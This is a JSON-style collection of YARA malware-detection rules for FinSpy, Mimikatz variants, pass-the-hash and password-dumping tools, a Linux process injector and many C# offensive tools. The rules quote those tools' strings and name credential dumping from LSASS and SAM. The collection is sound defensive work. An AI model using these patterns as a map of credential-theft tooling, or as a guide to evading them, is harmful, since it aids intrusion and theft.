  "FinSpy": "rule FinSpy\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n        author = \"AlienVault Labs\"\n\n    strings:\n        $filter1 = \"$password14\"\n        $filter2 = \"$screenrec7\"\n        $filter3 = \"$micrec\"\n        $filter4 = \"$skyperec3\"\n        $filter5 = \"$mouserec2\"\n        $filter6 = \"$driver\"\n        $filter7 = \"$janedow2\"\n        $filter8 = \"$bootkit2\"\n\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        //$mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        //$mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        //$versions1 = /(f)inspyv2/ nocase\n        //$versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)\n}",
  "Powerkatz_DLL_Generic": "rule Powerkatz_DLL_Generic {\n\tmeta:\n\t\tdescription = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"PowerKatz Analysis\"\n\t\tdate = \"2016-02-05\"\n\t\tsuper_rule = 1\n\t\tscore = 80\n\t\thash1 = \"c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae\"\n\t\thash2 = \"1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0\"\n\t\thash3 = \"49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872\"\n\tstrings:\n\t\t$s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n\t\t$s2 = \"%*s  pPublicKey         : \" fullword wide\n\t\t$s3 = \"ad_hoc_network_formed\" fullword wide\n\t\t$s4 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n\t\t$s5 = \"\\\\*.kirbi\" fullword wide\n\n\t\t$c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n\t\t$c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}",
  "is__str_mandibule_gen1": "rule is__str_mandibule_gen1 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$str01 = \"shared arguments too big\" fullword nocase wide ascii\n\t\t$str02 = \"self inject pid: %\" fullword nocase wide ascii\n\t\t$str03 = \"injected shellcode at 0x%lx\" fullword nocase wide ascii        \t\n\t\t$str04 = \"target pid: %d\" fullword nocase wide ascii        \t\n\t\t$str05 = \"mapping '%s' into memory at 0x%lx\" fullword nocase wide ascii\n\t\t$str06 = \"shellcode injection addr: 0x%lx\" fullword nocase wide ascii\n\t\t$str07 = \"loading elf at: 0x%llx\" fullword nocase wide ascii\n\tcondition:\n                4 of them\n}",
  "is__hex_top_mandibule64": "rule is__hex_top_mandibule64 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$hex01 = { 48 8D 05 43 01 00 00 48 89 E7 FF D0 } // st\n\t\t$hex02 = { 53 48 83 EC 50 48 89 7C 24 08 48 8B 44 24 08 } // mn\n\t\t$hex03 = { 48 81 EC 18 02 00 00 89 7C 24 1C 48 89 74 } // pt\n\t\t$hex04 = { 53 48 81 EC 70 01 01 00 48 89 7C 24 08 48 8D 44 24 20 48 05 00 00 } // ld\n\tcondition:\n                3 of them \n}",
  "is__hex_mid_mandibule32": "rule is__hex_mid_mandibule32 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-06-01\"\n\tstrings:\n\t\t$hex05 = { E8 09 07 00 00 81 C1 FC 1F 00 00 8D 81 26 E1 FF FF } // st\n\t\t$hex06 = { 56 53 83 EC 24 E8 E1 05 00 00 81 C3 D0 1E 00 00 8B 44 24 30} // mn\n\t\t$hex07 = { 81 C3 E8 29 00 00 C7 44 24 0C } // pt\n\t\t$hex08 = { E8 C6 D5 FF FF 83 C4 0C 68 00 01 00 00 } // ld\n\tcondition:\n                3 of them \n}",
  "TOOLKIT_Mandibule": "rule TOOLKIT_Mandibule {\n\tmeta:\n\t\tdescription = \"Generic detection for ELF Linux process injector mandibule generic\"\n\t\treference = \"https://imgur.com/a/MuHSZtC\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-06-01\"\n\tcondition:\n\t\t((is__str_mandibule_gen1) or (is__hex_mid_mandibule32))\n\t\tor ((is__str_mandibule_gen1) or (is__hex_top_mandibule64))\n\t\tand is__elf\n\t\tand filesize < 30KB \n}",
  "whosthere_alt": "rule whosthere_alt : Toolkit {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de\"\n\tstrings:\n\t\t$s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */\n\t\t$s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s2 = \"dump output to a file, -o filename\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */\n\t\t$s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii /* score: '24.00' */\n\t\t$s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s6 = \".\\\\pth.dll\" fullword ascii /* score: '16.00' */\n\t\t$s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 280KB and 2 of them\n}",
  "iam_alt_iam_alt": "rule iam_alt_iam_alt : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90\"\n\tstrings:\n\t\t$s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */\n\t\t$s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */\n\t\t$s3 = \"username:domainname:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s4 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii /* score: '12.00' */\n\t\t$s6 = \"nthash is too long!.\" fullword ascii /* score: '8.00' */\n\t\t$s7 = \"LSASS HANDLE: %x\" fullword ascii /* score: '5.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}",
  "genhash_genhash": "rule genhash_genhash : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file genhash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f\"\n\tstrings:\n\t\t$s1 = \"genhash.exe <password>\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"Password: %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii /* score: '11.00' */\n\t\t$s5 = \"This tool generates LM and NT hashes.\" fullword ascii /* score: '10.00' */\n\t\t$s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii /* score: '10.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}",
  "iam_iamdll": "rule iam_iamdll : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iamdll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602\"\n\tstrings:\n\t\t$s0 = \"LSASRV.DLL\" fullword ascii /* score: '21.00' */\n\t\t$s1 = \"iamdll.dll\" fullword ascii /* score: '21.00' */\n\t\t$s2 = \"ChangeCreds\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 115KB and all of them\n}",
  "iam_iam": "rule iam_iam : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231\"\n\tstrings:\n\t\t$s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s2 = \"iam.exe -h administrator:mydomain:\"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */\n\t\t$s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */\n\t\t$s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii /* score: '26.00' */\n\t\t$s6 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s7 = \"Checking LSASRV.DLL....\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "whosthere_alt_pth": "rule whosthere_alt_pth : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file pth.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0\"\n\tstrings:\n\t\t$s0 = \"c:\\\\debug.txt\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n\t\t$s1 = \"pth.dll\" fullword ascii /* score: '20.00' */\n\t\t$s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii /* score: '7.00' */\n\t\t$s3 = \"\\\"Primary\\\" string not found!\" fullword ascii /* score: '6.00' */\n\t\t$s4 = \"segment 1 found at %.8Xh\" fullword ascii /* score: '6.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 4 of them\n}",
  "whosthere": "rule whosthere : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37\"\n\tstrings:\n\t\t$s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */\n\t\t$s2 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */\n\t\t$s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n\t\t$s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and 2 of them\n}",
  "Powerstager": "rule Powerstager\n{\n    meta:\n      author = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n      date = \"02JAN2018\"\n      hash1 = \"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa\" //x86\n      hash2 = \"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5\" //x64\n      description = \"Detects PowerStager Windows executable, both x86 and x64\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/\"\n      reference2 = \"https://github.com/z0noxz/powerstager\"\n    \n    strings:\n      $filename = /%s\\\\[a-zA-Z0-9]{12}/\n      $pathname = \"TEMP\" wide ascii\n//    $errormsg = \"The version of this file is not compatible with the version of Windows you're running.\" wide ascii\n      $filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n      $apicall_01 = \"memset\"\n      $apicall_02 = \"getenv\"\n      $apicall_03 = \"fopen\"\n      $apicall_04 = \"memcpy\"\n      $apicall_05 = \"fwrite\"\n      $apicall_06 = \"fclose\"\n      $apicall_07 = \"CreateProcessA\"\n      $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n      $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n      $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n      $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n\n    condition:\n      uint16be(0) == 0x4D5A\n        and\n      all of ($apicall_*)\n        and\n      $filename\n        and\n      $pathname\n        and\n      $filedesc\n        and\n      (2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}",
  "QuarksPwDump_Gen": "rule QuarksPwDump_Gen : Toolkit  {\n\tmeta:\n\t\tdescription = \"Detects all QuarksPWDump versions\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-09-29\"\n\t\tscore = 80\n\t\thash1 = \"2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa\"\n\t\thash2 = \"87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f\"\n\t\thash3 = \"a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9\"\n\t\thash4 = \"c5cbb06caa5067fdf916e2f56572435dd40439d8e8554d3354b44f0fd45814ab\"\n\t\thash5 = \"677c06db064ee8d8777a56a641f773266a4d8e0e48fbf0331da696bea16df6aa\"\n\t\thash6 = \"d3a1eb1f47588e953b9759a76dfa3f07a3b95fab8d8aa59000fd98251d499674\"\n\t\thash7 = \"8a81b3a75e783765fe4335a2a6d1e126b12e09380edc4da8319efd9288d88819\"\n\tstrings:\n\t\t$s1 = \"OpenProcessToken() error: 0x%08X\" fullword ascii\n\t\t$s2 = \"%d dumped\" fullword ascii\n\t\t$s3 = \"AdjustTokenPrivileges() error: 0x%08X\" fullword ascii\n\t\t$s4 = \"\\\\SAM-%u.dmp\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "HKTL_NET_GUID_CSharpSetThreadContext": "rule HKTL_NET_GUID_CSharpSetThreadContext {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/djhohnstein/CSharpSetThreadContext\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a1e28c8c-b3bd-44de-85b9-8aa7c18a714d\" ascii nocase wide\n        $typelibguid1 = \"87c5970e-0c77-4182-afe2-3fe96f785ebb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DLL_Injection": "rule HKTL_NET_GUID_DLL_Injection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ihack4falafel/DLL-Injection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3d7e1433-f81a-428a-934f-7cc7fcf1149d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_LimeUSB_Csharp": "rule HKTL_NET_GUID_LimeUSB_Csharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeUSB-Csharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"94ea43ab-7878-4048-a64e-2b21b3b4366d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Ladon": "rule HKTL_NET_GUID_Ladon {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/Ladon\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c335405f-5df2-4c7d-9b53-d65adfbed412\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_WhiteListEvasion": "rule HKTL_NET_GUID_WhiteListEvasion {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/khr0x40sh/WhiteListEvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"858386df-4656-4a1e-94b7-47f6aa555658\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Lime_Downloader": "rule HKTL_NET_GUID_Lime_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ec7afd4c-fbc4-47c1-99aa-6ebb05094173\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DarkEye": "rule HKTL_NET_GUID_DarkEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/K1ngSoul/DarkEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0bdb9c65-14ed-4205-ab0c-ea2151866a7f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpKatz": "rule HKTL_NET_GUID_SharpKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8568b4c1-2940-4f6c-bf4e-4383ef268be9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ExternalC2": "rule HKTL_NET_GUID_ExternalC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ryhanson/ExternalC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7266acbb-b10d-4873-9b99-12d2043b1d4e\" ascii nocase wide\n        $typelibguid1 = \"5d9515d0-df67-40ed-a6b2-6619620ef0ef\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Povlsomware": "rule HKTL_NET_GUID_Povlsomware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/povlteksttv/Povlsomware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fe0d5aa7-538f-42f6-9ece-b141560f7781\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RunShellcode": "rule HKTL_NET_GUID_RunShellcode {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zerosum0x0/RunShellcode\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ec18a3-674c-4131-a7f5-acbed034b819\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpLoginPrompt": "rule HKTL_NET_GUID_SharpLoginPrompt {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpLoginPrompt\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c12e69cd-78a0-4960-af7e-88cbd794af97\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Adamantium_Thief": "rule HKTL_NET_GUID_Adamantium_Thief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/Adamantium-Thief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6104bc9-fea9-4ee9-b919-28156c1f2ede\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PSByPassCLM": "rule HKTL_NET_GUID_PSByPassCLM {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/PSByPassCLM\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"46034038-0113-4d75-81fd-eb3b483f2662\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_physmem2profit": "rule HKTL_NET_GUID_physmem2profit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FSecureLABS/physmem2profit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"814708c9-2320-42d2-a45f-31e42da06a94\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_NoAmci": "rule HKTL_NET_GUID_NoAmci {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/NoAmci\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"352e80ec-72a5-4aa6-aabe-4f9a20393e8e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpBlock": "rule HKTL_NET_GUID_SharpBlock {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/CCob/SharpBlock\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3cf25e04-27e4-4d19-945e-dadc37c81152\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_nopowershell": "rule HKTL_NET_GUID_nopowershell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/nopowershell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"555ad0ac-1fdb-4016-8257-170a74cb2f55\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
